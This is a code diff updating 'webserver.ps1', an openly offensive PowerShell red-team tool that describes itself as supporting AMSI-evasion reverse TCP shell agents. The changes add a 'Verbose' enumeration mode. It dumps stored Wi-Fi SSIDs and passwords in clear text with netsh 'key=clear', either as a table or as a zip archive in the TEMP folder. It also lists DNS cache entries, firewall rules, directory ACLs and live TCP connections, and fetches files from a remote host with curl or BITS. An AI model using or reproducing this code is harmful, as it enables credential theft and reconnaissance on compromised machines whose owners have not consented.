@@ -5,8 +5,8 @@
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - Build 18363
    Required Dependencies: python (http.server)
-   Optional Dependencies: curl|Start-BitsTransfer
-   PS cmdlet Dev version: v1.14
+   Optional Dependencies: curl|BitsTransfer
+   PS cmdlet Dev version: v1.15
 
 .DESCRIPTION
    This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
@@ -83,10 +83,10 @@
    PS C:\> .\webserver.ps1 -SEnum True
    Remote Host Web Browser Enumeration, DNS Records, DHCP
    User-Agent, Default Browser, TCP Headers, MainWindowTitle
+   Wifi Stored credentials (ZIP archive), Anti-Virus status.
 
-   PS C:\> .\webserver.ps1 -SEnum SSIDump
-   Store SSID Passwords dump into a zip file insted
-   of display stored passwords in terminal windows.
+   PS C:\> .\webserver.ps1 -SEnum Verbose
+   @webserver agressive (verbose) enumeration module
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Sessions List
@@ -139,7 +139,7 @@
 )
 
 $HiddeMsgBox = $False
-$CmdletVersion = "v1.14"
+$CmdletVersion = "v1.15"
 $Initial_Path = (pwd).Path
 $Server_hostName = (hostname)
 $Server_Working_Dir = "$SPath"
@@ -162,11 +162,12 @@ $Banner = @"
    ==== ====   ======== =======  ======  ======== ===  ===    ==    ======== ===  ===
           Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam} $CmdletVersion
 
+
 "@;
 Clear-Host;
 Write-Host $Banner;
 
-If($Download -ne "False"){write-host ""
+If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
 $FileName = $Download.split(',')[1] ## Extract the filename from -Download "string"
 If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False'){
@@ -198,7 +199,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    cmd /c curl -s http://$ServerIP/$FileName -o $FileName|Out-Null
    If(-not($LASTEXITCODE -eq 0)){## Download using BitsTransfer service insted of curl.exe
       Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
-      Write-Host "Trying to download $FileName Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
+      Start-Sleep -Milliseconds 300;Write-Host "Trying to download $FileName Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
       Start-BitsTransfer -priority foreground -Source http://$ServerIP/$FileName -Destination $Initial_Path\$FileName -ErrorAction SilentlyContinue|Out-Null   
       If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $FileName using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}
    }
@@ -595,31 +596,30 @@ If(-not($Installation) -or $Installation -ieq $null){
       write-host "";Start-Sleep -Seconds 1
    }
 
-   ## WebBrowser Enumeration (-SEnum True)
-   If($SEnum -ieq "True" -or $SEnum -ieq "SSIDump"){
+   ## WebBrowser Enumeration (-SEnum True|Verbose)
+   If($SEnum -ieq "True" -or $SEnum -ieq "Verbose"){
 
       <#
       .SYNOPSIS
-         Remote Host Web Browser Simple Enumeration
+         Remote Host Web Browser Enumeration
 
       .DESCRIPTION
          Remote Host Web Browser Enumeration, DNS Records, DHCP
          User-Agent, Default Browser, TCP Headers, MainWindowTitle
+         Wifi Stored credentials (ZIP archive), Anti-Virus status.
 
       .EXAMPLE
          PS C:\> .\webserver.ps1 -SEnum True
-         Remote Host Web Browser Simple Enumeration ..
+         Remote Host Web Browser Default Enumeration ..
 
       .EXAMPLE
-         PS C:\> .\webserver.ps1 -SEnum SSIDump
-         Store SSID Passwords dump into a zip file ..
+         PS C:\> .\webserver.ps1 -SEnum Verbose
+         @webserver agressive (verbose) enumeration module
       #>
 
       ## Internal Variable Declarations
       $SSID = (Get-WmiObject Win32_OperatingSystem).Caption
       $OsVersion = (Get-WmiObject Win32_OperatingSystem).Version
-      $FirewallRule = netsh advfirewall firewall show rule name="python.exe"|findstr "Rule Name:"
-      $FirewallState = netsh advfirewall firewall show rule name="python.exe"|findstr "Enabled:"
       $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
       $recon_age = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
       $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
@@ -628,9 +628,7 @@ If(-not($Installation) -or $Installation -ieq $null){
       $BrowserPath = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty Path
       $Browserversion = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty ProductVersion
       $StoreData = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
-      $ActiveTabName = $StoreData | where {$_ -ne ""}
-      $dataone = $FirewallRule -replace 'Rule Name:                            ',''
-      $datatwo = $FirewallState -replace 'Enabled:                              ','' 
+      $ActiveTabName = $StoreData|Where {$_ -ne ""}
 
          ## WebBrowser Headers Enumeration (pure powershell)
          $Url = "http://${Remote_Host}:${Remote_Server_Port}/"
@@ -644,7 +642,7 @@ If(-not($Installation) -or $Installation -ieq $null){
             $Site = Invoke-WebRequest $url;$WebContent = $Site.Content|findstr "title"
             $WebTitle = $WebContent -replace '<title>','' -replace '</title>',''
 
-         ## Build output Table
+         ## Build Output Table
          Write-Host "Enumeration"
          write-host "-----------"
          write-host "Shell Privs      : $report"
@@ -656,9 +654,16 @@ If(-not($Installation) -or $Installation -ieq $null){
          write-host "User-Agent       : $recon_age"
          write-host "WebBrowserPath   : $BrowserPath"
          write-host "ActiveTabName    : $ActiveTabName"
-         write-host "WebServerTitle   : $WebTitle"
-         write-host "FirewallRuleName : $dataone"
-         write-host "RuleEnabledStatus: $datatwo`n"
+         write-host "WebServerTitle   : $WebTitle`n"
+
+      If($SEnum -ieq "Verbose"){
+         ## Display @webserver firewall rule
+         echo "" > $Env:TMP\PSfirewall.log
+         echo "webserver Firewall" >> $Env:TMP\PSfirewall.log
+         echo "------------------" >> $Env:TMP\PSfirewall.log
+         cmd /c netsh advfirewall firewall show rule name="python.exe"|findstr /V "^[Ok.]"|findstr /V "^[-]"|Where {$_ -ne ""} >> $Env:TMP\PSfirewall.log
+         Get-Content -Path "$Env:TMP\PSfirewall.log";Remove-Item -Path "$Env:TMP\PSfirewall.log" -Force
+      }
 
       ## TCP Connections enumeration
       echo "" > $Env:TMP\logfile.log
@@ -672,37 +677,63 @@ If(-not($Installation) -or $Installation -ieq $null){
       echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
       cmd /c netstat -ano|findstr "ESTABLISHED"|findstr /V "::"|findstr /V "["|findstr /V "UDP" >> $Env:TMP\logfile.log
       Get-Content $Env:TMP\logfile.log;Remove-Item $Env:TMP\logfile.log -Force
-      Write-Host ""
 
-      ## Capture wlan interface passwords
-      If($SEnum -ieq "SSIDump"){
-         ## Dump SSID passwords into a zip file
-         $DumpFolder = "SSIDump";$DumpFile = "SSIDump.zip"
-         If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
-         netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
-         Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force
-         Write-Host "SSID Dump stored under: $Env:TMP\SSIDump.zip" -ForeGroundColor Yellow
-         Start-Sleep -Seconds 1;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
-      }Else{
+      ## @weberver active sessions List
+      Write-Host "`nSession  Pid   StartTime  Bind          Port  Directory"
+      Write-Host "-------  ---   ---------  ----          ----  ---------"
+      If(Test-Path "$Env:TMP\sessions.log"){
+         foreach($KeyId in Get-Content "$Env:TMP\sessions.log"){
+            $Count++;Start-Sleep -Milliseconds 700
+            Write-Host "  $Count      $KeyId"
+         }
+      }
+
+      If($SEnum -ieq "Verbose"){
+         ## @Webserver Working dir ACL Description
+         Write-Host "`nWorking Directory (ACL)"
+         Write-Host "-----------------------"
+         $GetACLDescription = icacls "$Server_Working_Dir"|findstr /V "processing"
+         echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
+         Remove-Item -Path "$Env:TMP\ACl.log" -Force
+      }
+
+      ## Enumeration Verbose module
+      If($SEnum -ieq "Verbose"){
+
+         ## List Remote-Host DNS entrys
+         $GetDnsData = Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize
+         echo $GetDnsData > $Env:TMP\dns.log;Get-Content -Path "$Env:TMP\dns.log"
+         Remove-Item -Path "$Env:TMP\dns.log" -Force
+
          ## Dump SSID passwords into terminal prompt
          $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
          $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''
 
          ## Create Data Table for output
-         $mytable = new-object System.Data.DataTable
-         $mytable.Columns.Add("SSID name") | Out-Null
-         $mytable.Columns.Add("Password") | Out-Null
+         $mytable = New-Object System.Data.DataTable
+         $mytable.Columns.Add("WiFi SSID Name")|Out-Null
+         $mytable.Columns.Add("Password")|Out-Null
 
          foreach($Token in $DataParse){
             $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
             $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
-            ## Put results in the data table   
-            $mytable.Rows.Add("$Token",
-                              "$Key") | Out-Null
+            ## Put results in the Data Table   
+            $mytable.Rows.Add("$Token","$Key")|Out-Null
          }
-         ## Display Table
-         $mytable|Format-Table -AutoSize > $Env:TMP\lk.log
-         Get-Content -Path "$Env:TMP\lk.log";Remove-Item "$Env:TMP\lk.log" -Force
+         ## Display Data Table
+         $mytable|Format-Table -AutoSize > $Env:TMP\wifidump.log
+         Get-Content -Path "$Env:TMP\wifidump.log";Remove-Item "$Env:TMP\wifidump.log" -Force
+
+      }Else{
+
+         ## Dump SSID passwords into a zip file
+         $DumpFolder = "SSIDump";$DumpFile = "SSIDump.zip"
+         If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
+         netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
+         Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force
+         Write-Host "`n`n  Wifi SSID Dump stored under: $Env:TMP\SSIDump.zip" -ForeGroundColor Yellow
+         Start-Sleep -Seconds 1;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
+
       }
    }
 }
